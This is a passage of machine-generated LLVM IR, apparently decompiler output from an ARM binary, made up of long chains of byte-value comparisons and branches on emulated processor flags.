dec_label_pc_fe7c:                                ; preds = %dec_label_pc_fe54, %.thread583, %bb1860, %bb1855
  store i32 %.2021, i32* %r3.global-to-local, align 4
  %v2_fe80 = icmp ugt i32 %v1_e870, 18
  store i1 %v2_fe80, i1* %cpsr_c.global-to-local, align 1
  %v7_fe80 = icmp eq i32 %v1_e870, 19
  store i1 %v7_fe80, i1* %cpsr_z.global-to-local, align 1
  %v2_fe84 = xor i1 %v2_fe80, true
  %v3_fe84 = or i1 %v7_fe80, %v2_fe84
  br i1 %v3_fe84, label %bb1861, label %bb1862

bb1861:                                           ; preds = %dec_label_pc_fe7c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1862

bb1862:                                           ; preds = %dec_label_pc_fe7c, %bb1861
  %v4_fe88 = phi i32 [ %.2021, %dec_label_pc_fe7c ], [ 0, %bb1861 ]
  %v2_fe88 = xor i1 %v7_fe80, true
  %v3_fe88 = and i1 %v2_fe80, %v2_fe88
  br i1 %v3_fe88, label %bb1863, label %thread-pre-split586

bb1863:                                           ; preds = %bb1862
  store i32 %v4_fe88, i32* %r3.global-to-local, align 4
  br label %thread-pre-split586

thread-pre-split586:                              ; preds = %bb1862, %bb1863
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fe8c = icmp eq i32 %v4_fe88, 0
  store i1 %v2_fe8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fe8c, label %dec_label_pc_fe9c, label %dec_label_pc_fe94

dec_label_pc_fe94:                                ; preds = %thread-pre-split586
  %v2_fe94 = icmp ugt i32 %v1_e870, 22
  store i1 %v2_fe94, i1* %cpsr_c.global-to-local, align 1
  %v7_fe94 = icmp eq i32 %v1_e870, 23
  store i1 %v7_fe94, i1* %cpsr_z.global-to-local, align 1
  %v2_fe98 = xor i1 %v2_fe94, true
  %v3_fe98 = or i1 %v7_fe94, %v2_fe98
  br i1 %v3_fe98, label %dec_label_pc_e858, label %dec_label_pc_fe9c

dec_label_pc_fe9c:                                ; preds = %dec_label_pc_fe94, %thread-pre-split586
  %v7_fe9c = icmp eq i32 %v1_e85c, 35
  %.2034 = zext i1 %v7_fe9c to i32
  store i32 %.2034, i32* %r3.global-to-local, align 4
  store i1 %v2_eb50, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_eb50, i1* %cpsr_z.global-to-local, align 1
  %v2_feac = xor i1 %v2_eb50, true
  %v3_feac = or i1 %v7_eb50, %v2_feac
  br i1 %v3_feac, label %.thread589, label %bb1866

.thread589:                                       ; preds = %dec_label_pc_fe9c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fec0

bb1866:                                           ; preds = %dec_label_pc_fe9c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_feb0 = icmp eq i1 %v7_fe9c, false
  store i1 %v2_feb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_feb0, label %dec_label_pc_fec0, label %dec_label_pc_feb8

dec_label_pc_feb8:                                ; preds = %bb1866
  %v2_feb8 = icmp ugt i32 %v1_e870, 181
  store i1 %v2_feb8, i1* %cpsr_c.global-to-local, align 1
  %v7_feb8 = icmp eq i32 %v1_e870, 182
  store i1 %v7_feb8, i1* %cpsr_z.global-to-local, align 1
  %v2_febc = xor i1 %v2_feb8, true
  %v3_febc = or i1 %v7_feb8, %v2_febc
  br i1 %v3_febc, label %dec_label_pc_e858, label %dec_label_pc_fec0

dec_label_pc_fec0:                                ; preds = %.thread589, %dec_label_pc_feb8, %bb1866
  %v2_fec4 = icmp ugt i32 %v1_e85c, 51
  store i1 %v2_fec4, i1* %cpsr_c.global-to-local, align 1
  %v7_fec4 = icmp eq i32 %v1_e85c, 52
  %.2035 = zext i1 %v7_fec4 to i32
  store i32 %.2035, i32* %r3.global-to-local, align 4
  %v2_fed0 = and i32 %.2035, %v0_fed0
  %v4_fed0 = icmp eq i32 %v2_fed0, 0
  store i1 %v4_fed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fed0, label %dec_label_pc_fee0, label %dec_label_pc_fed8

dec_label_pc_fed8:                                ; preds = %dec_label_pc_fec0
  store i1 %v2_f908, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f908, i1* %cpsr_z.global-to-local, align 1
  %v2_fedc = xor i1 %v2_f908, true
  %v3_fedc = or i1 %v7_f908, %v2_fedc
  br i1 %v3_fedc, label %dec_label_pc_e858, label %dec_label_pc_fee0.thread

dec_label_pc_fee0.thread:                         ; preds = %dec_label_pc_fed8
  store i1 %v2_f908, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f908, i1* %cpsr_z.global-to-local, align 1
  br label %bb1870

dec_label_pc_fee0:                                ; preds = %dec_label_pc_fec0
  %.pre2180 = xor i1 %v2_f908, true
  %.pre2181 = or i1 %v7_f908, %.pre2180
  store i1 %v2_f908, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f908, i1* %cpsr_z.global-to-local, align 1
  br i1 %.pre2181, label %bb1869, label %bb1870

bb1869:                                           ; preds = %dec_label_pc_fee0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1870

bb1870:                                           ; preds = %dec_label_pc_fee0.thread, %dec_label_pc_fee0, %bb1869
  %v4_fee8 = phi i32 [ %.2035, %dec_label_pc_fee0 ], [ 0, %bb1869 ], [ %.2035, %dec_label_pc_fee0.thread ]
  %v3_fee4.pre-phi2183 = phi i1 [ false, %dec_label_pc_fee0 ], [ true, %bb1869 ], [ false, %dec_label_pc_fee0.thread ]
  %v2_fee8 = xor i1 %v7_f908, true
  %v3_fee8 = and i1 %v2_f908, %v2_fee8
  br i1 %v3_fee8, label %bb1871, label %thread-pre-split593

bb1871:                                           ; preds = %bb1870
  store i32 %v4_fee8, i32* %r3.global-to-local, align 4
  br label %thread-pre-split593

thread-pre-split593:                              ; preds = %bb1870, %bb1871
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_feec = icmp eq i32 %v4_fee8, 0
  store i1 %v2_feec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_feec, label %dec_label_pc_fefc, label %dec_label_pc_fef4

dec_label_pc_fef4:                                ; preds = %thread-pre-split593
  %v2_fef4 = icmp eq i32 %v1_e870, 255
  store i1 %v2_fef4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_faf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_faf4, label %dec_label_pc_fefc, label %dec_label_pc_e858

dec_label_pc_fefc:                                ; preds = %dec_label_pc_fef4, %thread-pre-split593
  %v2_ff00 = icmp ugt i32 %v1_e85c, 53
  store i1 %v2_ff00, i1* %cpsr_c.global-to-local, align 1
  %v7_ff00 = icmp eq i32 %v1_e85c, 54
  %.2036 = zext i1 %v7_ff00 to i32
  store i32 %.2036, i32* %r3.global-to-local, align 4
  %v2_ff0c = and i32 %.2036, %v0_ff0c
  %v4_ff0c = icmp eq i32 %v2_ff0c, 0
  store i1 %v4_ff0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ff0c, label %dec_label_pc_ff1c, label %dec_label_pc_ff14

dec_label_pc_ff14:                                ; preds = %dec_label_pc_fefc
  store i1 %v2_f908, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_fee4.pre-phi2183, label %dec_label_pc_e858, label %dec_label_pc_ff1c

dec_label_pc_ff1c:                                ; preds = %dec_label_pc_ff14, %dec_label_pc_fefc
  %v2_ff1c = icmp ugt i32 %v1_e870, 142
  store i1 %v2_ff1c, i1* %cpsr_c.global-to-local, align 1
  %v7_ff1c = icmp eq i32 %v1_e870, 143
  store i1 %v7_ff1c, i1* %cpsr_z.global-to-local, align 1
  %v2_ff20 = xor i1 %v2_ff1c, true
  %v3_ff20 = or i1 %v7_ff1c, %v2_ff20
  br i1 %v3_ff20, label %bb1874, label %bb1875

bb1874:                                           ; preds = %dec_label_pc_ff1c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1875

bb1875:                                           ; preds = %dec_label_pc_ff1c, %bb1874
  %v4_ff24 = phi i32 [ %.2036, %dec_label_pc_ff1c ], [ 0, %bb1874 ]
  %v2_ff24 = xor i1 %v7_ff1c, true
  %v3_ff24 = and i1 %v2_ff1c, %v2_ff24
  br i1 %v3_ff24, label %bb1876, label %thread-pre-split595

bb1876:                                           ; preds = %bb1875
  store i32 %v4_ff24, i32* %r3.global-to-local, align 4
  br label %thread-pre-split595

thread-pre-split595:                              ; preds = %bb1875, %bb1876
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff28 = icmp eq i32 %v4_ff24, 0
  store i1 %v2_ff28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff28, label %dec_label_pc_ff38, label %dec_label_pc_ff30

dec_label_pc_ff30:                                ; preds = %thread-pre-split595
  %v2_ff30 = icmp eq i32 %v1_e870, 255
  store i1 %v2_ff30, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_faf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_faf4, label %dec_label_pc_ff38, label %dec_label_pc_e858

dec_label_pc_ff38:                                ; preds = %dec_label_pc_ff30, %thread-pre-split595
  %v7_ff38 = icmp eq i32 %v1_e85c, 13
  %.2037 = zext i1 %v7_ff38 to i32
  %v2_ff44 = icmp ugt i32 %v1_e870, 50
  store i1 %v2_ff44, i1* %cpsr_c.global-to-local, align 1
  %v7_ff44 = icmp eq i32 %v1_e870, 51
  store i1 %v7_ff44, i1* %cpsr_z.global-to-local, align 1
  %v2_ff48 = xor i1 %v2_ff44, true
  %v3_ff48 = or i1 %v7_ff44, %v2_ff48
  br i1 %v3_ff48, label %bb1879, label %bb1880

bb1879:                                           ; preds = %dec_label_pc_ff38
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1880

bb1880:                                           ; preds = %dec_label_pc_ff38, %bb1879
  %v0_ff50.pr = phi i32 [ %v4_ff24, %dec_label_pc_ff38 ], [ 0, %bb1879 ]
  %v2_ff4c = xor i1 %v7_ff44, true
  %v3_ff4c = and i1 %v2_ff44, %v2_ff4c
  br i1 %v3_ff4c, label %bb1881, label %thread-pre-split597

bb1881:                                           ; preds = %bb1880
  store i32 %.2037, i32* %r3.global-to-local, align 4
  br label %thread-pre-split597

thread-pre-split597:                              ; preds = %bb1880, %bb1881
  %v0_ff50 = phi i32 [ %.2037, %bb1881 ], [ %v0_ff50.pr, %bb1880 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff50 = icmp eq i32 %v0_ff50, 0
  store i1 %v2_ff50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff50, label %dec_label_pc_ff60, label %dec_label_pc_ff58

dec_label_pc_ff58:                                ; preds = %thread-pre-split597
  store i1 %v2_ebd8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ebd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f298, label %dec_label_pc_e858, label %dec_label_pc_ff60

dec_label_pc_ff60:                                ; preds = %dec_label_pc_ff58, %thread-pre-split597
  store i1 %v2_fc2c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_fc2c, i1* %cpsr_z.global-to-local, align 1
  %v2_ff64 = xor i1 %v2_fc2c, true
  %v3_ff64 = or i1 %v7_fc2c, %v2_ff64
  br i1 %v3_ff64, label %bb1882, label %bb1883

bb1882:                                           ; preds = %dec_label_pc_ff60
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1883

bb1883:                                           ; preds = %dec_label_pc_ff60, %bb1882
  %v0_ff6c.pr = phi i32 [ %v0_ff50, %dec_label_pc_ff60 ], [ 0, %bb1882 ]
  %v2_ff68 = xor i1 %v7_fc2c, true
  %v3_ff68 = and i1 %v2_fc2c, %v2_ff68
  br i1 %v3_ff68, label %bb1884, label %thread-pre-split598

bb1884:                                           ; preds = %bb1883
  store i32 %.2037, i32* %r3.global-to-local, align 4
  br label %thread-pre-split598

thread-pre-split598:                              ; preds = %bb1883, %bb1884
  %v0_ff6c = phi i32 [ %.2037, %bb1884 ], [ %v0_ff6c.pr, %bb1883 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff6c = icmp eq i32 %v0_ff6c, 0
  store i1 %v2_ff6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff6c, label %dec_label_pc_ff7c, label %dec_label_pc_ff74

dec_label_pc_ff74:                                ; preds = %thread-pre-split598
  store i1 %v2_e984, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e984, i1* %cpsr_z.global-to-local, align 1
  %v2_ff78 = xor i1 %v2_e984, true
  %v3_ff78 = or i1 %v7_e984, %v2_ff78
  br i1 %v3_ff78, label %dec_label_pc_e858, label %dec_label_pc_ff7c

dec_label_pc_ff7c:                                ; preds = %dec_label_pc_ff74, %thread-pre-split598
  %v2_ff7c = icmp ugt i32 %v1_e870, 171
  store i1 %v2_ff7c, i1* %cpsr_c.global-to-local, align 1
  %v7_ff7c = icmp eq i32 %v1_e870, 172
  store i1 %v7_ff7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff7c, label %.thread599, label %.thread600

.thread600:                                       ; preds = %dec_label_pc_ff7c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ff90

.thread599:                                       ; preds = %dec_label_pc_ff7c
  store i32 %.2015, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff88 = icmp eq i1 %v7_f1c0, false
  store i1 %v2_ff88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff88, label %dec_label_pc_ff90, label %dec_label_pc_e858

dec_label_pc_ff90:                                ; preds = %.thread600, %.thread599
  %v2_ff90 = icmp ugt i32 %v1_e870, 13
  store i1 %v2_ff90, i1* %cpsr_c.global-to-local, align 1
  %v7_ff90 = icmp eq i32 %v1_e870, 14
  store i1 %v7_ff90, i1* %cpsr_z.global-to-local, align 1
  %v2_ff94 = xor i1 %v2_ff90, true
  %v3_ff94 = or i1 %v7_ff90, %v2_ff94
  br i1 %v3_ff94, label %bb1885, label %bb1886

bb1885:                                           ; preds = %dec_label_pc_ff90
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1886

bb1886:                                           ; preds = %dec_label_pc_ff90, %bb1885
  %v2_ff98 = xor i1 %v7_ff90, true
  %v3_ff98 = and i1 %v2_ff90, %v2_ff98
  br i1 %v3_ff98, label %thread-pre-split603, label %thread-pre-split603.thread

thread-pre-split603.thread:                       ; preds = %bb1886
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_103c8

thread-pre-split603:                              ; preds = %bb1886
  store i32 %.2032, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff9c = icmp eq i1 %v7_fae0, false
  store i1 %v2_ff9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff9c, label %dec_label_pc_103c8, label %dec_label_pc_ffa4

dec_label_pc_ffa4:                                ; preds = %thread-pre-split603
  %v2_ffa4 = icmp eq i32 %v1_e870, 255
  store i1 %v2_ffa4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_faf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_faf4, label %dec_label_pc_ffac, label %dec_label_pc_e858

dec_label_pc_ffac:                                ; preds = %dec_label_pc_103c8, %bb1920, %bb1918, %dec_label_pc_ffa4
  %v2_ffac = icmp ugt i32 %v1_e85c, 211
  store i1 %v2_ffac, i1* %cpsr_c.global-to-local, align 1
  %v7_ffac = icmp eq i32 %v1_e85c, 212
  store i1 %v7_ffac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffac, label %.thread604, label %.thread605

.thread605:                                       ; preds = %dec_label_pc_ffac
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ffcc

.thread604:                                       ; preds = %dec_label_pc_ffac
  store i32 %.2022, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ffb8 = icmp eq i1 %v7_f430, false
  store i1 %v2_ffb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ffb8, label %dec_label_pc_ffcc, label %dec_label_pc_ffc0

dec_label_pc_ffc0:                                ; preds = %.thread604
  %v2_ffc0 = icmp eq i32 %v1_e874, 255
  store i1 %v2_ffc0, i1* %cpsr_c.global-to-local, align 1
  %v7_ffc0 = icmp eq i32 %v1_e874, 255
  store i1 %v7_ffc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffc0, label %dec_label_pc_ffcc, label %bb1887

bb1887:                                           ; preds = %dec_label_pc_ffc0
  %v3_ffc4 = icmp ugt i32 %v1_e874, 222
  store i1 %v3_ffc4, i1* %cpsr_c.global-to-local, align 1
  %v8_ffc4 = icmp eq i32 %v1_e874, 223
  store i1 %v8_ffc4, i1* %cpsr_z.global-to-local, align 1
  %v2_ffc8 = xor i1 %v8_ffc4, true
  %v3_ffc8 = and i1 %v3_ffc4, %v2_ffc8
  br i1 %v3_ffc8, label %dec_label_pc_e858, label %dec_label_pc_ffcc

dec_label_pc_ffcc:                                ; preds = %dec_label_pc_ffc0, %.thread605, %bb1887, %.thread604
  store i32 %.1995, i32* %r3.global-to-local, align 4
  %v2_ffd0 = icmp ugt i32 %v1_e85c, 88
  store i1 %v2_ffd0, i1* %cpsr_c.global-to-local, align 1
  %v7_ffd0 = icmp eq i32 %v1_e85c, 89
  store i1 %v7_ffd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffd0, label %.thread608, label %.thread609

.thread609:                                       ; preds = %dec_label_pc_ffcc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10000

.thread608:                                       ; preds = %dec_label_pc_ffcc
  store i32 %.1995, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ffdc = icmp eq i1 %v7_ebf4, false
  store i1 %v2_ffdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ffdc, label %dec_label_pc_10000, label %dec_label_pc_ffe4

dec_label_pc_ffe4:                                ; preds = %.thread608
  %v2_ffe4 = icmp ugt i32 %v1_e874, 94
  store i1 %v2_ffe4, i1* %cpsr_c.global-to-local, align 1
  %v7_ffe4 = icmp eq i32 %v1_e874, 95
  store i1 %v7_ffe4, i1* %cpsr_z.global-to-local, align 1
  %v2_ffe8 = xor i1 %v2_ffe4, true
  %v3_ffe8 = or i1 %v7_ffe4, %v2_ffe8
  br i1 %v3_ffe8, label %bb1888, label %bb1889

bb1888:                                           ; preds = %dec_label_pc_ffe4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1889

bb1889:                                           ; preds = %dec_label_pc_ffe4, %bb1888
  %v0_fff8.pr1059 = phi i32 [ %.1995, %dec_label_pc_ffe4 ], [ 0, %bb1888 ]
  %v2_ffec = xor i1 %v7_ffe4, true
  %v3_ffec = and i1 %v2_ffe4, %v2_ffec
  br i1 %v3_ffec, label %bb1890, label %bb1891

bb1890:                                           ; preds = %bb1889
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1891

bb1891:                                           ; preds = %bb1889, %bb1890
  %v0_fff8.pr = phi i32 [ %v0_fff8.pr1059, %bb1889 ], [ 1, %bb1890 ]
  %v2_fff0 = icmp ugt i32 %v1_e874, 95
  store i1 %v2_fff0, i1* %cpsr_c.global-to-local, align 1
  %v7_fff0 = icmp eq i32 %v1_e874, 96
  store i1 %v7_fff0, i1* %cpsr_z.global-to-local, align 1
  %v2_fff4 = xor i1 %v7_fff0, true
  %v3_fff4 = and i1 %v2_fff0, %v2_fff4
  br i1 %v3_fff4, label %.thread613, label %bb1892

.thread613:                                       ; preds = %bb1891
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10000

bb1892:                                           ; preds = %bb1891
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fff8 = icmp eq i32 %v0_fff8.pr, 0
  store i1 %v2_fff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fff8, label %dec_label_pc_10000, label %dec_label_pc_e858

dec_label_pc_10000:                               ; preds = %.thread613, %.thread609, %bb1892, %.thread608
  %v7_10000 = icmp eq i32 %v1_e85c, 219
  %.2038 = zext i1 %v7_10000 to i32
  store i32 %.2038, i32* %r3.global-to-local, align 4
  %v2_1000c = icmp ugt i32 %v1_e870, 214
  store i1 %v2_1000c, i1* %cpsr_c.global-to-local, align 1
  %v7_1000c = icmp eq i32 %v1_e870, 215
  store i1 %v7_1000c, i1* %cpsr_z.global-to-local, align 1
  %v2_10010 = xor i1 %v2_1000c, true
  %v3_10010 = or i1 %v7_1000c, %v2_10010
  br i1 %v3_10010, label %.thread618, label %bb1895

.thread618:                                       ; preds = %dec_label_pc_10000
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10024

bb1895:                                           ; preds = %dec_label_pc_10000
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10014 = icmp eq i1 %v7_10000, false
  store i1 %v2_10014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10014, label %dec_label_pc_10024, label %dec_label_pc_1001c

dec_label_pc_1001c:                               ; preds = %bb1895
  %v2_1001c = icmp ugt i32 %v1_e870, 229
  store i1 %v2_1001c, i1* %cpsr_c.global-to-local, align 1
  %v7_1001c = icmp eq i32 %v1_e870, 230
  store i1 %v7_1001c, i1* %cpsr_z.global-to-local, align 1
  %v2_10020 = xor i1 %v2_1001c, true
  %v3_10020 = or i1 %v7_1001c, %v2_10020
  br i1 %v3_10020, label %dec_label_pc_e858, label %dec_label_pc_10024

dec_label_pc_10024:                               ; preds = %.thread618, %dec_label_pc_1001c, %bb1895
  %v7_10024 = icmp eq i32 %v1_e85c, 23
  %.2039 = zext i1 %v7_10024 to i32
  store i32 %.2039, i32* %r3.global-to-local, align 4
  store i1 %v2_fe00, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_fe00, i1* %cpsr_z.global-to-local, align 1
  %v2_10034 = xor i1 %v2_fe00, true
  %v3_10034 = or i1 %v7_fe00, %v2_10034
  br i1 %v3_10034, label %.thread623, label %bb1898

.thread623:                                       ; preds = %dec_label_pc_10024
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10048

bb1898:                                           ; preds = %dec_label_pc_10024
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10038 = icmp eq i1 %v7_10024, false
  store i1 %v2_10038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10038, label %dec_label_pc_10048, label %dec_label_pc_10040

dec_label_pc_10040:                               ; preds = %bb1898
  %v2_10040 = icmp ugt i32 %v1_e870, 107
  store i1 %v2_10040, i1* %cpsr_c.global-to-local, align 1
  %v7_10040 = icmp eq i32 %v1_e870, 108
  store i1 %v7_10040, i1* %cpsr_z.global-to-local, align 1
  %v2_10044 = xor i1 %v2_10040, true
  %v3_10044 = or i1 %v7_10040, %v2_10044
  br i1 %v3_10044, label %dec_label_pc_e858, label %dec_label_pc_10048

dec_label_pc_10048:                               ; preds = %.thread623, %dec_label_pc_10040, %bb1898
  store i32 %.2020, i32* %r3.global-to-local, align 4
  store i1 %v2_f7c8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f7c8, i1* %cpsr_z.global-to-local, align 1
  %v2_10050 = xor i1 %v2_f7c8, true
  %v3_10050 = or i1 %v7_f7c8, %v2_10050
  br i1 %v3_10050, label %bb1899, label %bb1900

bb1899:                                           ; preds = %dec_label_pc_10048
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1900

bb1900:                                           ; preds = %dec_label_pc_10048, %bb1899
  %v4_10054 = phi i32 [ %.2020, %dec_label_pc_10048 ], [ 0, %bb1899 ]
  %v2_10054 = xor i1 %v7_f7c8, true
  %v3_10054 = and i1 %v2_f7c8, %v2_10054
  br i1 %v3_10054, label %bb1901, label %thread-pre-split626

bb1901:                                           ; preds = %bb1900
  store i32 %v4_10054, i32* %r3.global-to-local, align 4
  br label %thread-pre-split626

thread-pre-split626:                              ; preds = %bb1900, %bb1901
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10058 = icmp eq i32 %v4_10054, 0
  store i1 %v2_10058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10058, label %dec_label_pc_10068, label %dec_label_pc_10060

dec_label_pc_10060:                               ; preds = %thread-pre-split626
  store i1 %v2_f35c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f35c, i1* %cpsr_z.global-to-local, align 1
  %v2_10064 = xor i1 %v2_f35c, true
  %v3_10064 = or i1 %v7_f35c, %v2_10064
  br i1 %v3_10064, label %dec_label_pc_e858, label %dec_label_pc_10068

dec_label_pc_10068:                               ; preds = %dec_label_pc_10060, %thread-pre-split626
  %v7_10068 = icmp eq i32 %v1_e85c, 106
  %.2040 = zext i1 %v7_10068 to i32
  store i32 %.2040, i32* %r3.global-to-local, align 4
  store i1 %v2_fbb0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_fbb0, i1* %cpsr_z.global-to-local, align 1
  %v2_10078 = xor i1 %v2_fbb0, true
  %v3_10078 = or i1 %v7_fbb0, %v2_10078
  br i1 %v3_10078, label %.thread629, label %bb1904

.thread629:                                       ; preds = %dec_label_pc_10068
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1008c

bb1904:                                           ; preds = %dec_label_pc_10068
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1007c = icmp eq i1 %v7_10068, false
  store i1 %v2_1007c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1007c, label %dec_label_pc_1008c, label %dec_label_pc_10084

dec_label_pc_10084:                               ; preds = %bb1904
  %v2_10084 = icmp ugt i32 %v1_e870, 187
  store i1 %v2_10084, i1* %cpsr_c.global-to-local, align 1
  %v7_10084 = icmp eq i32 %v1_e870, 188
  store i1 %v7_10084, i1* %cpsr_z.global-to-local, align 1
  %v2_10088 = xor i1 %v2_10084, true
  %v3_10088 = or i1 %v7_10084, %v2_10088
  br i1 %v3_10088, label %dec_label_pc_e858, label %dec_label_pc_1008c

dec_label_pc_1008c:                               ; preds = %.thread629, %dec_label_pc_10084, %bb1904
  %v7_1008c = icmp eq i32 %v1_e85c, 34
  %.2041 = zext i1 %v7_1008c to i32
  store i32 %.2041, i32* %r3.global-to-local, align 4
  %v2_10098 = icmp ugt i32 %v1_e870, 243
  store i1 %v2_10098, i1* %cpsr_c.global-to-local, align 1
  %v7_10098 = icmp eq i32 %v1_e870, 244
  store i1 %v7_10098, i1* %cpsr_z.global-to-local, align 1
  %v2_1009c = xor i1 %v2_10098, true
  %v3_1009c = or i1 %v7_10098, %v2_1009c
  br i1 %v3_1009c, label %.thread634, label %bb1907

.thread634:                                       ; preds = %dec_label_pc_1008c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_100b0

bb1907:                                           ; preds = %dec_label_pc_1008c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_100a0 = icmp eq i1 %v7_1008c, false
  store i1 %v2_100a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_100a0, label %dec_label_pc_100b0, label %dec_label_pc_100a8

dec_label_pc_100a8:                               ; preds = %bb1907
  %v2_100a8 = icmp eq i32 %v1_e870, 255
  store i1 %v2_100a8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_faf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_faf4, label %dec_label_pc_100b0, label %dec_label_pc_e858

dec_label_pc_100b0:                               ; preds = %.thread634, %dec_label_pc_100a8, %bb1907
  %v7_100b0 = icmp eq i32 %v1_e85c, 87
  %.2042 = zext i1 %v7_100b0 to i32
  store i32 %.2042, i32* %r3.global-to-local, align 4
  store i1 %v2_eafc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_eafc, i1* %cpsr_z.global-to-local, align 1
  %v2_100c0 = xor i1 %v2_eafc, true
  %v3_100c0 = or i1 %v7_eafc, %v2_100c0
  br i1 %v3_100c0, label %.thread639, label %bb1910

.thread639:                                       ; preds = %dec_label_pc_100b0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_100d4

bb1910:                                           ; preds = %dec_label_pc_100b0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_100c4 = icmp eq i1 %v7_100b0, false
  store i1 %v2_100c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_100c4, label %dec_label_pc_100d4, label %dec_label_pc_100cc

